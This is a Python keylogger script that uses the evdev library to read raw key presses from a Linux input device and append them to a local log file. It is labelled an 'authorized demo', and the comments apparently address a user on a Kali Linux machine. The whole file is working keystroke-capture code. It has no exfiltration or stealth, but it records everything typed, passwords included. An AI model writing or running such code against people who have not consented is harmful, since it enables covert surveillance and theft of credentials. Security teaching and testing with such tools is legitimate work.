import evdev
from evdev import ecodes
from datetime import datetime
import os
import sys

# We identified this from your 'cat /proc/bus/input/devices' screenshot
DEVICE_PATH = "/dev/input/event0" 
LOG_FILE = "keylog_evdev.txt"

def write_log(text):
    """Writes text to the log file safely."""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(text)
    except Exception as e:
        print(f"File write error: {e}")

def main():
    # Initialize log file
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("=== Authorized Keylogger Demo (evdev) ===\n")
        f.write(f"Started: {datetime.now()}\n")
        f.write("Type only in a controlled environment. Press Ctrl+C to stop.\n\n")

    try:
        # Connect to the keyboard device
        dev = evdev.InputDevice(DEVICE_PATH)
        print(f"Keylogger demo running. Listening on: {dev.path} ({dev.name})")
        print(f"Log file: {os.path.abspath(LOG_FILE)}")
        print("Type some text, then press Ctrl+C to stop gracefully.")

        # Listen for events
        for event in dev.read_loop():
            if event.type == ecodes.EV_KEY:
                key_event = evdev.categorize(event)
                
                # Only log when the key is pressed down (value == 1)
                if key_event.keystate == key_event.key_down:
                    key_name = key_event.keycode
                    
                    # Some keys return a list of possible codes, we grab the first
                    if isinstance(key_name, list):
                        key_name = key_name[0]
                    
                    # Format specific keys for readability
                    if key_name == 'KEY_SPACE':
                        char = ' '
                    elif key_name == 'KEY_ENTER':
                        char = '\n'
                    elif key_name == 'KEY_BACKSPACE':
                        char = '[BACKSPACE]'
                    elif key_name.startswith('KEY_'):
                        char = key_name.replace('KEY_', '')
                    else:
                        char = key_name
                    
                    write_log(char)

    except PermissionError:
        print("\n[!] Permission denied. You MUST run this script as root.")
        print(f"Run: sudo /home/kali/Desktop/keylog_env/bin/python {sys.argv[0]}")
        sys.exit(1)
    except FileNotFoundError:
        print(f"\n[!] Device {DEVICE_PATH} not found. Check your event number.")
        sys.exit(1)
    except KeyboardInterrupt:
        # Graceful Ctrl+C exit
        write_log(f"\n\n[Stopped by Ctrl+C at {datetime.now()}]\n")
        print("\n\nCtrl+C caught. Demo ended gracefully.")

if __name__ == "__main__":
    main()
